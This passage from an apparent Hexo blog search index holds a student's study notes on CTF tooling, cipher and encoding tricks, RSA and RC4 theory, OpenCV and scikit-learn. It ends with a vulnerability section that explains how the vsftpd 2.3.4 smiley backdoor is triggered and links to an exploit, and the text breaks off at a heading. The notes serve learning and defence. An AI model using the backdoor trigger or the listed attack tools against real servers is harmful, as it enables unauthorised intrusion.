阴阳怪气密码</h4><blockquote><p><a href="https://mmdjiji.gitee.io/yygq.js/">阴阳怪气密码加解密</a></p><p>特点：不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？</p></blockquote><h4 id="2-4-熊曰佛曰兽语颜文字"><a href="#2-4-熊曰佛曰兽语颜文字" class="headerlink" title="2.4 熊曰佛曰兽语颜文字"></a>2.4 熊曰佛曰兽语颜文字</h4><blockquote><p><a href="http://hi.pcmoe.net/roar.html">熊曰佛曰兽语颜文字加解密</a></p></blockquote><ul><li><strong>熊曰：</strong>呋食動森冬和笨物森嘍嗅嗄呆捕爾噔氏意歡萌麼誒呦沒沒喜取樣沒果肉噔沒麼象眠嗡囑怎爾盜註</li><li><strong>新佛曰：</strong>諸隸僧降吽諸冥陀摩冥隸僧缽薩嚤伏空願哆蜜吶斯祗咒嚤所冥僧冥諸訶塞囉冥吽莊咒</li><li><strong>兽语：</strong>~呜嗷啊呜呜~呜呜嗷啊啊啊啊啊嗷嗷呜啊嗷嗷~</li><li><strong>颜文字：ﾟ</strong>ωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //<em>´∇｀</em>/ [‘<em>‘]; o=(ﾟｰﾟ)  =</em>=    3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^<em>^o)/ (o^</em>^o);(ﾟДﾟ)=</li></ul><h4 id="2-5-垃圾邮件"><a href="#2-5-垃圾邮件" class="headerlink" title="2.5 垃圾邮件"></a>2.5 垃圾邮件</h4><blockquote><p><a href="https://www.spammimic.com/encode.cgi">垃圾邮件加解密</a></p><p>特点：Dear Professional ; Especially for you - this cutting-edge<br>intelligence ! If you no longer wish to receive our<br>publications simply reply with a Subject: of “REMOVE”<br>and you will immediately be removed from our club .<br>This mail is being sent in compliance with Senate bill<br>2216 ; Title 9 ; Section 306 . This is a ligitimate<br>business proposal ! Why work for somebody else when<br>you can become rich inside 99 weeks . Have you ever<br>noticed people love convenience and people love convenience<br>. Well, now is your chance to capitalize on this .<br>WE will help YOU process your orders within seconds<br>and use credit cards on your website ! You are guaranteed<br>to succeed because we take all the risk ! But don’t<br>believe us . Mrs Anderson of Indiana tried us and says<br>“I was skeptical but it worked for me” . We assure<br>you that we operate within all applicable laws . You<br>will blame yourself forever if you don’t order now<br>. Sign up a friend and you’ll get a discount of 10%<br>! Thank-you for your serious consideration of our offer<br>! </p></blockquote><h3 id="3-整活密码"><a href="#3-整活密码" class="headerlink" title="3 整活密码"></a>3 整活密码</h3><ul><li><p>娉娉袅袅十三余,豆蔻梢头二月初</p><blockquote><p>ppnn13%dkstFeb.1st</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学工具知识</title>
      <link href="/posts/e3bc6d90.html"/>
      <url>/posts/e3bc6d90.html</url>
      
        <content type="html"><![CDATA[<h1 id="Crypto工具"><a href="#Crypto工具" class="headerlink" title="Crypto工具"></a>Crypto工具</h1><hr><h2 id="一、解密工具"><a href="#一、解密工具" class="headerlink" title="一、解密工具"></a>一、解密工具</h2><h3 id="1-CTF工具箱"><a href="#1-CTF工具箱" class="headerlink" title="1 CTF工具箱"></a>1 CTF工具箱</h3><h3 id="2-yafu-1-34"><a href="#2-yafu-1-34" class="headerlink" title="2 yafu-1.34"></a>2 yafu-1.34</h3><blockquote><p>下载：CTF工具箱。</p><p>使用 ： .\yafu-x64 “factor( n )”</p></blockquote><h3 id="3-在线网页"><a href="#3-在线网页" class="headerlink" title="3 在线网页"></a>3 在线网页</h3><ul><li><p>md5破解</p><blockquote><p><a href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p><p><a href="https://pmd5.com/">md5解密 MD5在线解密 破解md5 (pmd5.com)</a></p><p><a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p></blockquote></li></ul><hr><h2 id="二、Python配置"><a href="#二、Python配置" class="headerlink" title="二、Python配置"></a>二、Python配置</h2><blockquote><p><a href=".\a378bd8e">text::Python</a></p><p><a href="https://www.cnblogs.com/RicL/p/16638528.html">.sage文件</a></p><p><a href="https://pypi.org/">official::Python库</a></p></blockquote><ul><li><p><a href="https://pythonhosted.org/pycrypto/Crypto-module.html">Crypto模块</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="comment"># 随机获得一个(2 ** ( size - 1 )  ~  2 ** ( size )）的质数</span></span><br><span class="line">number.getPrime(size)</span><br><span class="line"><span class="comment"># 求e在fn中的逆元</span></span><br><span class="line">number.inverse(e,fn)</span><br></pre></td></tr></table></figure></li><li><p>libnum模块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字符串变数字（每个字符变成十六进制，然后组成一个长十六进制，之后转化成十进制）</span></span><br><span class="line">s2n( <span class="built_in">str</span> )</span><br><span class="line"><span class="comment"># 数字变字符串</span></span><br><span class="line">n2s( num )</span><br></pre></td></tr></table></figure></li><li><p><a href="https://geek-docs.com/python/python-os-module/python-os-urandom-method.html">os模块</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成一个大小为size字节的字符串，适合密码学使用，或者我们可以说这个方法生成一个包含随机字符的字符串。</span></span><br><span class="line">urandom(size)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF例题</title>
      <link href="/posts/2b0d66fa.html"/>
      <url>/posts/2b0d66fa.html</url>
      
        <content type="html"><![CDATA[<h1 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-反序列化"><a href="#1-反序列化" class="headerlink" title="1 反序列化"></a>1 反序列化</h3><blockquote><p><a href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a>：unseping，<a href="https://www.cnblogs.com/niyani/p/16961716.html">unseping题解</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF案例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 安全实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学编码知识</title>
      <link href="/posts/fbb199ac.html"/>
      <url>/posts/fbb199ac.html</url>
      
        <content type="html"><![CDATA[<h1 id="Crypto编码"><a href="#Crypto编码" class="headerlink" title="Crypto编码"></a>Crypto编码</h1><hr><h2 id="一、常见编码"><a href="#一、常见编码" class="headerlink" title="一、常见编码"></a>一、常见编码</h2><blockquote><p><a href="https://blog.csdn.net/Ahuuua/article/details/109189985">密码学常见编码</a></p></blockquote><h3 id="1-URL编码"><a href="#1-URL编码" class="headerlink" title="1 URL编码"></a>1 URL编码</h3><blockquote><p>%num（十六进制）：用于url中</p></blockquote><h3 id="2-HTML编码"><a href="#2-HTML编码" class="headerlink" title="2 HTML编码"></a>2 HTML编码</h3><blockquote><p>&amp;#num （十进制）：用于html中</p></blockquote><h3 id="3-UTF-8"><a href="#3-UTF-8" class="headerlink" title="3 UTF-8"></a>3 UTF-8</h3><blockquote><p>UTF-16：英文 2B，中文 2B。（浪费空间，被优化成了 UTF-8）</p><p>UTF-8：英文 1B，中文 2B。</p></blockquote><h3 id="4-base家族"><a href="#4-base家族" class="headerlink" title="4 base家族"></a>4 base家族</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/454458711">base全家桶概念</a></p><p><a href="http://www.metools.info/code/base92.html">base92解密</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF工具</title>
      <link href="/posts/d5a2797b.html"/>
      <url>/posts/d5a2797b.html</url>
      
        <content type="html"><![CDATA[<h1 id="CTF工具"><a href="#CTF工具" class="headerlink" title="CTF工具"></a>CTF工具</h1><h2 id="启动器Rolan"><a href="#启动器Rolan" class="headerlink" title="启动器Rolan"></a>启动器Rolan</h2><blockquote><p>BUG1：左键点击无法启动。</p><p>解决：右键——管理员运行——取消。</p></blockquote><h2 id="File"><a href="#File" class="headerlink" title="File"></a>File</h2><blockquote><p><a href=".\a2cc6fde">text::文件工具</a></p></blockquote><ul><li>Stegsolve</li><li>AU</li><li>CQR</li><li>ARCHPR*3</li><li>010PotPlayer</li><li>gifsplitter</li><li>SpaceSniffer</li><li>Snipaste</li><li>ClearImage </li></ul><h2 id="Internet"><a href="#Internet" class="headerlink" title="Internet"></a>Internet</h2><blockquote><p> <a href=".\f60fa43a">text::流量工具</a></p></blockquote><ul><li><p>Wireshare</p></li><li><p>putty：<a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">安装</a></p><blockquote><p>使用：ip地址——SSH协议。</p></blockquote></li></ul><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><blockquote><p><a href=".\e3bc6d90">text::Crypto工具</a></p></blockquote><ul><li>yafu-1</li><li>CTF-Tools</li><li>CaptfEncoder</li><li>小葵转化器</li><li>Converter</li></ul><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><blockquote><p><a href=".\68e517a">text::Reverse工具</a></p></blockquote><ul><li>(吾爱破解) </li><li>die</li><li>ida</li><li>CE</li><li>金手指</li></ul><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><blockquote><p><a href=".\5cfe0bd9">text::Web渗透工具</a></p></blockquote><ul><li>PHPStudy</li><li>firefox</li><li>BurpSuit</li><li>Antsword</li><li>御剑后台扫描</li><li>御剑高速端口</li><li>御剑WEB指纹</li><li>curl</li></ul><h2 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h2><ul><li>VMware</li><li>SQLserver</li><li>Windscribe</li><li>Github</li><li>battoexe</li><li>连点器</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF案例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 安全实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学理论知识</title>
      <link href="/posts/30ce291f.html"/>
      <url>/posts/30ce291f.html</url>
      
        <content type="html"><![CDATA[<h1 id="Crypto理论"><a href="#Crypto理论" class="headerlink" title="Crypto理论"></a>Crypto理论</h1><blockquote><p><a href=".\7302411">text::Crypto密码</a></p></blockquote><hr><h2 id="一、密码学概论"><a href="#一、密码学概论" class="headerlink" title="一、密码学概论"></a>一、密码学概论</h2><hr><h2 id="二、古典密码"><a href="#二、古典密码" class="headerlink" title="二、古典密码"></a>二、古典密码</h2><h3 id="1-置换加密"><a href="#1-置换加密" class="headerlink" title="1 置换加密"></a>1 置换加密</h3><ul><li><p>定义</p><blockquote><p>字符的位置与其他字符发生变换。</p></blockquote></li></ul><h3 id="2-代换加密"><a href="#2-代换加密" class="headerlink" title="2 代换加密"></a>2 代换加密</h3><ul><li><p>定义</p><blockquote><p>字符用其他字符代替。</p></blockquote></li></ul><h3 id="3-词频分析"><a href="#3-词频分析" class="headerlink" title="3 词频分析"></a>3 词频分析</h3><blockquote><p><a href="https://quipqiup.com/">词频分析网站</a></p></blockquote><hr><h2 id="三、信道通信"><a href="#三、信道通信" class="headerlink" title="三、信道通信"></a>三、信道通信</h2><hr><h2 id="四、现代密码"><a href="#四、现代密码" class="headerlink" title="四、现代密码"></a>四、现代密码</h2><h3 id="1-序列密码"><a href="#1-序列密码" class="headerlink" title="1 序列密码"></a>1 序列密码</h3><h4 id="1-1-原理"><a href="#1-1-原理" class="headerlink" title="1.1 原理"></a>1.1 原理</h4><ul><li><p>定义</p><blockquote><p>序列密码又称流密码（同函数不同密钥）。</p></blockquote></li><li><p>优势</p><ol><li>硬件实现简单。</li><li>可以逐个字符处理。</li><li>有较理想的数学分析工具。</li></ol></li><li><p>用处</p><blockquote><p>军事，外交等国家重要部门的保密通信。</p></blockquote></li><li><p>过程</p><blockquote><p>先由密钥生成一个密钥流序列，再依次加密。</p></blockquote><ul><li>明文流：M = m1m2m3…mi…</li><li>密钥流：K = k1k2k3….ki…</li><li>加密算法：C=c1c2c3…ci… = Ek1(m1)Ek2(m2)….</li><li>解密算法：M=m1m2m3…mo… = Dk1(c1)Dk2(c2)…</li></ul></li><li><p>设计</p><blockquote><p>序列密码的设计重点是密钥流生成器。</p></blockquote></li></ul><h4 id="1-2-分类"><a href="#1-2-分类" class="headerlink" title="1.2 分类"></a>1.2 分类</h4><ul><li><p>自同步流密码</p></li><li><p>异步流密码</p></li></ul><h4 id="1-3-案例"><a href="#1-3-案例" class="headerlink" title="1.3 案例"></a>1.3 案例</h4><ul><li><p>A5算法</p></li><li><p>RC4算法</p><ol><li><p>RC4密码算法原理</p><blockquote><p>RC4算法是一种流密码，密钥长度可变，面向字节操作。以下是原理说明中使用的主要变量。</p></blockquote><ol><li><p>密钥流</p><blockquote><p>RC4算法的关键是根据明文和密钥生成相应的密钥流，密钥流的长度和明文的长度是对应的，也就是说，如果明文的长度是500字节，那么密钥流的长度也是500字节，加密生成的密文也是500字节，因为密文第i字节=明文第i字节⊕密钥流第i字节。</p></blockquote></li><li><p>状态数组S</p><blockquote><p>长度为256字节，各单元为S[0]，S[1]，…，S[255]。每个单元为1字节，在算法运行的任何时候，S都包括0～255之间所有的8位二进制数，只不过值的位置发生了变化。</p></blockquote></li><li><p>临时数组T</p><blockquote><p>长度为256字节，每个单元为1字节。如果密钥的长度是256字节，就直接把密钥的值赋给T，否则轮转地将密钥的每字节赋给T。</p></blockquote></li><li><p>密钥K</p><blockquote><p>长度为1～256字节，密钥的长度与明文的长度、密钥流的长度没有必然关系，通常密钥的长度为16字节（128位）。</p></blockquote></li><li><p>密钥流Ks</p><blockquote><p>由从S的256个单元中按一种系统化的方式选出的一个单元生成，每生成一个Ks，S中的单元就被重新置换一次。</p></blockquote></li></ol><blockquote><p>RC4算法首先使用密钥编排算法（Key Scheduling Algorithm，KSA）来完成S和T的初始化及S的初始置换。在置换时使用密钥K，其长度一般取5～16字节，即40～128位，也可以更长，通常不超过256字节。首先用0～255初始化S，然后使用密钥进行替换。</p><p>完成S的初始化和初始置换后，密钥K就不再被使用了。在S[0]，S[1]，…，S[255]中，对每个S[I]，根据S的当前配置，将S[I]与另一字节置换，输出1字节的密钥流。当S[255]完成置换后，从S[0]开始进行重复操作。</p></blockquote></li><li><p>初始化S</p></li><li><p>随机序列生成</p></li></ol></li></ul><h3 id="2-分组密码"><a href="#2-分组密码" class="headerlink" title="2 分组密码"></a>2 分组密码</h3><h4 id="2-1-原理"><a href="#2-1-原理" class="headerlink" title="2.1 原理"></a>2.1 原理</h4><h4 id="2-2-案例"><a href="#2-2-案例" class="headerlink" title="2.2 案例"></a>2.2 案例</h4><ul><li>DES<img src="/posts/30ce291f/DES加密主过程.jpg" alt="img"></li></ul><ol><li><p>DES算法原理</p><blockquote><p>DES算法为密码体制中的对称密码体制，又被称为美国数据加密标准。</p><p>DES是一个分组加密算法，典型的DES以64位为分组对数据加密，加密和解密用的是同一个算法。<br>密钥长64位，密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位，使得每个密钥都有奇数个1），分组后的明文组和56位的密钥按位替代或交换的方法形成密文组。</p></blockquote></li></ol><ul><li>AES</li></ul><h3 id="3-Hash密码"><a href="#3-Hash密码" class="headerlink" title="3 Hash密码"></a>3 Hash密码</h3><blockquote><p><a href="http://www.paper.edu.cn/scholar/paper/wangxiaoyun-2">md5碰撞</a></p></blockquote><ul><li>性质<ol><li>抗碰撞。</li><li>不可逆。</li></ol></li></ul><h3 id="4-公钥密码"><a href="#4-公钥密码" class="headerlink" title="4 公钥密码"></a>4 公钥密码</h3><h4 id="4-1-案例"><a href="#4-1-案例" class="headerlink" title="4.1 案例"></a>4.1 案例</h4><ul><li>RSA</li></ul><blockquote><p><a href="https://xz.aliyun.com/t/2446">常见问题</a></p><p>原理：大质数的分解。</p></blockquote><ol><li>质数p q … 任取（可以不止两个）</li><li>n = p <em> q </em> …</li><li>φ( n ) = ( p - 1 ) <em> ( q - 1 ) </em> …</li><li>gcd( e , φ( n ) ) = 1 ，e为公钥，任取小于φ(n)的数  </li><li>d = e^-1 mod φ( n )，d为私钥</li><li>c = pow( m , e , n ) ，c = m ** e % n </li><li>m = pow ( c , d , n )，m = c ** d % n</li></ol><ul><li>ECC</li></ul><hr><h2 id="五、数字签名"><a href="#五、数字签名" class="headerlink" title="五、数字签名"></a>五、数字签名</h2><hr><h2 id="六、身份认证"><a href="#六、身份认证" class="headerlink" title="六、身份认证"></a>六、身份认证</h2><h3 id="1-HMAC"><a href="#1-HMAC" class="headerlink" title="1 HMAC"></a>1 HMAC</h3><blockquote><p>hmac主要应用在身份验证中</p><p><a href="https://zhuanlan.zhihu.com/p/136590049">HMAC</a></p></blockquote><ol><li>客户端发出登录请求。（假设是浏览器的GET请求） </li><li>服务器返回一个随机值，并在会话中记录这个随机值 。</li><li>客户端将该随机值作为密钥，用户密码进行hmac运算，然后提交给服务器。</li><li>服务器读取用户数据库中的用户密码和步骤2中发送的随机值做与客户端一样的hmac运算，然后与用户发送的结果比较，如果结果一致则验证用户合法。</li></ol><hr><h2 id="七、密钥管理"><a href="#七、密钥管理" class="headerlink" title="七、密钥管理"></a>七、密钥管理</h2>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Opencv</title>
      <link href="/posts/f19f4a3.html"/>
      <url>/posts/f19f4a3.html</url>
      
        <content type="html"><![CDATA[<h1 id="Opencv"><a href="#Opencv" class="headerlink" title="Opencv"></a>Opencv</h1><blockquote><p><a href="https://opencv.org/">official::官网</a></p></blockquote><hr><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><hr><h3 id="一、配置"><a href="#一、配置" class="headerlink" title="一、配置"></a>一、配置</h3><ol><li>官网下载包</li><li>包含目录：.\opencv\build\include 和 .\opencv\build\include\opencv2</li><li>库目录：.\opencv\build\x64\vc16\lib</li><li>链接器——输入——附加依赖项：opencv_world470d.lib（最后有个 d 表示是 debug 版）</li><li>环境变量添加：Path：.\opencv\build\x64\vc16\bin（可能没用）或 将 opencv_world470.lib 和 opencv_world470d.lib 放入 C:\Windows\System32</li></ol><hr><h3 id="二、基础使用"><a href="#二、基础使用" class="headerlink" title="二、基础使用"></a>二、基础使用</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;opencv2/opencv.hpp&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> cv;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看</span></span><br><span class="line"><span class="comment">//读取图片，mode是模式。返回 Mat 类。（mode：0（gray），1（BGR，默认））</span></span><br><span class="line"><span class="built_in">imread</span>( path , mode );</span><br><span class="line"><span class="comment">//显示图片，title是显示的图片重命名，Mat 是 Mat 类（同 title 会被覆盖）。</span></span><br><span class="line"><span class="built_in">imshow</span>( title , Mat );</span><br><span class="line"><span class="comment">//等待时间，0 是无限，单位ms。</span></span><br><span class="line"><span class="built_in">waitKey</span>( time );</span><br><span class="line"><span class="comment">//行列值。</span></span><br><span class="line">mat.rows/.cols;</span><br><span class="line"><span class="comment">//获取指定位的位值。（uchar：灰度图，Vec3b：三通道图（数组，遍历 [0 ~ 2] 表示 BGR））</span></span><br><span class="line">mat.<span class="built_in">at</span>&lt;uchar&gt;(i,j);</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改</span></span><br><span class="line"><span class="comment">//重写图片大小。</span></span><br><span class="line"><span class="built_in">resize</span>( in_img , out_img , <span class="built_in">Size</span>( col , row ) );</span><br><span class="line"><span class="comment">//写出图片。（要保存成 png，否则系统会压缩）</span></span><br><span class="line"><span class="built_in">imwrite</span>( <span class="string">&quot;*.png&quot;</span> , Mat );</span><br><span class="line"><span class="comment">//新建图片（CV_8UC1：单通道）</span></span><br><span class="line"><span class="function">Mat <span class="title">solve</span><span class="params">(row, col, CV_8UC1)</span></span>;</span><br></pre></td></tr></table></figure><hr><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="一、基础使用"><a href="#一、基础使用" class="headerlink" title="一、基础使用"></a>一、基础使用</h3><blockquote><p><a href="https://blog.csdn.net/Vici__/article/details/100714822">链接</a>    <a href="https://blog.csdn.net/m0_57787115/article/details/129975689">链接</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取图片，返回 Mat 类。</span></span><br><span class="line">imread( path , mode )</span><br><span class="line"><span class="comment">#显示图片，title是显示的图片重命名，Mat 是 Mat 类（同 title 会被覆盖）。</span></span><br><span class="line">imshow( title , Mat )</span><br><span class="line"><span class="comment">#等待时间，0 是无限，单位ms。</span></span><br><span class="line">waitKey( time )</span><br><span class="line"><span class="comment">#写出图片。（要保存成 png，否则系统会压缩）</span></span><br><span class="line">imwrite( <span class="string">&quot;*.png&quot;</span> , Mat )</span><br><span class="line"></span><br><span class="line"><span class="comment">#行列值元组。</span></span><br><span class="line">img.shape</span><br><span class="line"><span class="comment">#位值获取（灰度图是一个，彩色图是 BGR 值列表）</span></span><br><span class="line">img[i,j]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 新技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 视觉处理 </tag>
            
            <tag> C++ </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python_AI</title>
      <link href="/posts/9add283d.html"/>
      <url>/posts/9add283d.html</url>
      
        <content type="html"><![CDATA[<h1 id="Python-AI"><a href="#Python-AI" class="headerlink" title="Python_AI"></a>Python_AI</h1><blockquote><p><a href=".\a378bd8e">text::Python</a> </p></blockquote><hr><h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1 基本概念"></a>1 基本概念<img src="/posts/9add283d/分类结果混淆矩阵.jpg" alt></h3><ul><li><p><strong>基本名词</strong></p><blockquote><p>人工智能包含机器学习和深度学习，机器学习包含深度学习。</p></blockquote><ul><li><p>泛化：通用性。</p></li><li><p>非泛化：特殊性。</p></li><li><p>NFL定理：某些问题 model_a 优于 model_b，那么存在另一些问题 model_b 优于 model_a。</p></li><li><p>泛化误差：未来误差。</p></li><li><p>经验误差：训练集上的误差。</p></li><li><p>经验误差并非越小越好，会导致过拟合。</p></li><li><p>过拟合：限制条件太多。</p></li><li><p>欠拟合：限制条件太少。（比如所有绿色的都是树叶）</p></li></ul></li><li><p><strong>集合</strong></p><blockquote><p>测试集应与训练集互斥。</p></blockquote><ul><li>留出法：留出训练集的一部分用于测试。（20%左右)</li><li>交互验证：用 90% 进行训练，剩下 10%进行测试，循环 10 次。</li><li>自助采样：有放回的采样测试。</li></ul></li><li><p><strong>流程名词</strong></p><ul><li>算法参：人为设定的参数，也叫超参数。</li><li>模型参：学习的参数。</li><li>流程：训练集——测试集——验证集。</li><li>算法参确定后用：训练集 + 验证集测试。</li><li>查全率：所有的好西瓜中有多少比例被算法挑了出来。</li><li>查准率：算法挑出来的西瓜中有多少比例是好西瓜。</li></ul></li></ul><h3 id="2-机器学习"><a href="#2-机器学习" class="headerlink" title="2 机器学习"></a>2 机器学习</h3><blockquote><p>定义：机器学习好似从数据中自动分析获得模型，并利用模型对未知数据进行预测。</p><p>数据集构成：特征值 + 目标值（也可以没有目标值，直接进行分类）。</p></blockquote><ul><li><p>算法</p><ul><li><p>监督学习（supervised learning）（预测）</p><blockquote><p>定义：输入数据是由输入特征值和目标值所组成。函数的输出可以是一个连续的值（称为回归），或是输出是有限个离散值（称作分类）。</p></blockquote><ul><li>分类：k-近邻算法、贝叶斯分类、决策树与随机森林、逻辑回归。</li><li>回归：线性回归、岭回归。</li></ul></li><li><p>无监督学习（unsupervised learning）</p><ul><li>定义：输入数据是由输入特征值所组成。</li><li>聚类：k-means。</li></ul></li></ul></li><li><p>目标值</p><ul><li>类别 —— 分类问题。（监督学习）</li><li>连续型数据 —— 回归问题。（监督学习）</li><li>无 —— 聚类。（无监督学习）</li></ul></li><li><p>流程</p><ol><li>获得数据。</li><li>数据预处理。</li><li>特征工程。（将数据处理成机器可以识别的数据：特征值 + 目标值）</li><li>机器训练。</li><li>模型评估。</li><li>应用。</li></ol></li><li><p>深入学习</p><ul><li>机器学习——“西瓜书”——周志华</li><li>统计学习方法——李航</li><li>深度学习——“花书”</li></ul></li></ul><h3 id="3-特征工程"><a href="#3-特征工程" class="headerlink" title="3 特征工程"></a>3 特征工程</h3><ul><li><p>定义</p><ul><li><p>数据集</p><blockquote><p>数据集，数据接口：内部。</p></blockquote></li></ul><ul><li>学习数据集<ul><li>Kaggle：<a href="https://www.kaggle.com/datasets">Find Open Datasets and Machine Learning Projects | Kaggle</a></li><li>UCI数据集：<a href="http://archive.ics.uci.edu/ml/index.php">UCI Machine Learning Repository</a></li><li>scikit-learn：<a href="https://scikit-learn.org/stable/">scikit-learn: machine learning in Python — scikit-learn 1.2.2 documentation</a></li></ul></li></ul></li><li><p>Scikit-learn</p><ul><li><p>基本操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">pip install Scikit-learn <span class="comment">#可能会报缺少别的库</span></span><br><span class="line"><span class="keyword">import</span> sklearn</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sklearn包含：Classification（分类），Regression（回归），Clustering（聚类），Dimensionality reduction（降维），Model selection（模型选择），Preprocessing（特征工程）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用数据集</span></span><br><span class="line">sklearn.datasets.load_&lt;name&gt;() <span class="comment">#小数据集，本地保存。</span></span><br><span class="line">sklearn.dataset.fetch_&lt;name&gt;(data_home=<span class="literal">None</span> , subset=<span class="string">&quot;train&quot;</span>) <span class="comment">#大数据集，需要从网上下载。</span></span><br><span class="line"><span class="comment">#data_home：默认保存路径~/scikit_learn_data/；subset：train（训练集），test（测试集），all。</span></span><br></pre></td></tr></table></figure></li><li><p>返回值继承自字典的，datasets.base.Bunch，键如下：</p><ul><li>data：特征数据数组，是[n_samples * n_features]的二维numpy.ndarray 数组。</li><li>target：标签数组，是n_samples的一维numpy.ndarray数组。 </li><li>DESCR：数据描述。</li><li>feature_names：特征名,新闻数据，手写数字、回归数据集没有。</li><li>target_names：标签名。</li></ul></li><li><p>调用：<code>dict[&quot;key&quot;] || dict.key</code></p></li><li><p>数据集</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#小数据集</span></span><br><span class="line">sklearn.datasets.load_iris() <span class="comment">#鸢尾花</span></span><br><span class="line">sklearn.datasets.load_boston() <span class="comment">#波士顿房价</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#大数据集</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>分类算法</p></li><li><p>回归与聚类算法</p></li></ul><hr><h2 id="二、算法实现"><a href="#二、算法实现" class="headerlink" title="二、算法实现"></a>二、算法实现</h2><h3 id="1-bp神经网络"><a href="#1-bp神经网络" class="headerlink" title="1 bp神经网络"></a>1 bp神经网络</h3>]]></content>
      
      
      <categories>
          
          <category> 新技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Python </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞挖掘</title>
      <link href="/posts/e01eea27.html"/>
      <url>/posts/e01eea27.html</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><blockquote><p><a href="https://cve.mitre.org/">official::CVE</a></p><p><a href="https://www.seebug.org/">official::知道创宇</a></p><p><a href="https://vul.wangan.com/">official::网安</a></p></blockquote><h2 id="一、过去漏洞"><a href="#一、过去漏洞" class="headerlink" title="一、过去漏洞"></a>一、过去漏洞</h2><h3 id="1-vsftpd2-3-4笑脸漏洞（CVE-2011-2523）"><a href="#1-vsftpd2-3-4笑脸漏洞（CVE-2011-2523）" class="headerlink" title="1 vsftpd2.3.4笑脸漏洞（CVE-2011-2523）"></a>1 vsftpd2.3.4笑脸漏洞（CVE-2011-2523）</h3><blockquote><p><a href="https://blog.csdn.net/weixin_52347768/article/details/124594516">漏洞</a>    <a href="https://github.com/Magialeaf/exp/blob/main/vsftpd2.3.4笑脸漏洞.py">exp</a>    <a href="https://zhuanlan.zhihu.com/p/573004918">加固</a></p><p>原理：21端口，输入的字段中有 :) （0x3a，0x29）将会自动打开 6200 端口。</p></blockquote><h3 id="2-永恒之蓝（CVE-2017-0146）"><a href="#2-永恒之蓝（CVE-2017-0146）" class="headerlink" title="2 